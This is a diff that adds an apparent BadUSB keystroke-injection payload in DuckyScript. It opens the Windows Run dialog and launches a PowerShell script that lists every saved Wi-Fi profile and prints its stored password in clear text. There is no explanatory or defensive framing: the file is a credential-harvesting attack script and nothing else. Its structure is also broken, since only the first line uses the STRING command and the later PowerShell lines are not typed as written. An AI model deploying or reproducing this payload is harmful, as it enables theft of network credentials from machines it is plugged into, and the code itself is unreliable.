@@ -1,0 +1,28 @@
+GUI r
+DELAY 500
+STRING powershell # Get a list of all Wi-Fi profiles
+$profiles = netsh wlan show profiles
+ 
+# Extract the profile names
+$profileNames = ($profiles | Select-String 'All User Profile\s*:\s*(.*)$') | ForEach-Object { $_.Matches.Groups[1].Value }
+ 
+# Loop through each profile and retrieve the key content (password)
+foreach ($profile in $profileNames) {
+    # Get the profile details including the key content
+    $profileDetails = netsh wlan show profile name="$profile" key=clear
+ 
+    # Extract the password
+    $keyContent = ($profileDetails | Select-String 'Key Content\s*:\s*(.*)$') | ForEach-Object { $_.Matches.Groups[1].Value }
+ 
+    # Display the profile name and password
+    if ($keyContent) {
+        Write-Output "Profile Name: $profile"
+        Write-Output "Password: $keyContent"
+        Write-Output "----------------------"
+    } else {
+        Write-Output "Profile Name: $profile"
+        Write-Output "Password: Not found or not stored"
+        Write-Output "----------------------"
+    }
+}
+ENTER
